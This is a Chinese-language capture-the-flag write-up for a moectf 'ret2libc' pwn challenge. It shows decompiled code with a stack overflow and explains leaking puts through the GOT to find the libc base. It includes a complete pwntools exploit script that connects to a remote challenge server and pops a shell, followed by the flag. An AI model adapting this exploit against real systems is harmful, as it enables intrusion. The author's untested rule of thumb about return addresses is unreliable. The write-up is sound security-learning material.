# ret2libc

pwn系列的出题人是不是给题施了什么魔法？

这题本来只是个普通的ret2libc，没啥好写的，但是我没有按正常方法做出来，甚至于我都不知道怎么成功的。

-   Arch:     amd64-64-little
    <Br>RELRO:    Partial RELRO
    <Br>Stack:    No canary found
    <Br>NX:       NX enabled
    <Br>PIE:      No PIE (0x400000)

无pie无canary，rop最普通的入门配置。程序跟比赛中其他的rop系列差不多，只是这次main中没有调用system了。

```c
undefined8 main(void)
{
  puts("Go Go Go!!!");
  vuln();
  return 0;
}
```

vuln就更直白了，摆在那里给你溢出，装都不装一下。

```c
void vuln(void)
{
  undefined local_48 [64];
  read(0,local_48,112);
  return;
}
```

复习一下ret2libc思路。因为system和bin_sh没有在程序中出现，所以我们要把rop的目标放到程序使用的libc中。可是libc加载时基地址会随机偏移，我们无法准确知道要跳转的地址。但是libc中所有symbols相对于libc基地址的偏移是固定的，因此我们可以泄露出一个函数加载时的地址，减去其在libc中的偏移，得到当前libc加载地址，从而推断要使用的其他地址。至少需要两次rop链，一次泄露地址一次getshell。

main函数里使用了puts，那泄露puts肯定是首选的，第一是puts只需要一个参数，比较简单，第二是只能泄露出程序中已经使用过的函数，好像是因为没使用过的函数got表不会绑定，从而无法泄露。泄露方法很简单，把puts函数的got表放进rdi，再调用puts的plt。

接下来才到了最大的问题。泄露地址后要填写返回地址，我尝试了main的开始和vuln的开始，都不行。最后在调试的时候无意中记录了一个地址，vuln的返回地址，尝试返回这个返回地址时成功了。exp如下。

```python
from pwn import *
p=remote("124.223.158.81",27006)
puts_plt=0x00401064
puts_got=0x00404018
pop_rdi=0x0040117e
ret_addr=0x004011a7
libc_bin_sh=0x00000000001d8698
libc_puts=528080
libc_system=331104
puts_addr=0x00007f0a01939ed0
payload=b'a'*0x48+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)
p.sendafter("Go Go Go!!!",payload)
p.recvuntil(b'\n')
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
libc_base=puts_addr-libc_puts
system_addr=libc_base+libc_system
bin_sh=libc_base+libc_bin_sh
payload=b'a'*0x48+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)+p64(ret_addr)
p.send(payload)
p.interactive()
```

0x004011a7对应vuln的ret语句，我百思不得其解，这也行？返回到main或者vuln都会EOF，反而这个行。能返回还不是最离谱的，能填写第二次rop链才离谱。不懂这第二次rop链怎么被接收进去的，总之长个心眼，以后到处都返回不了就返回当前漏洞函数的返回地址。真的好离谱，出题人绝对会魔法。

- ### Flag
  > moectf{118c_15_cp20924m5_8357_f213nd_15n7_17}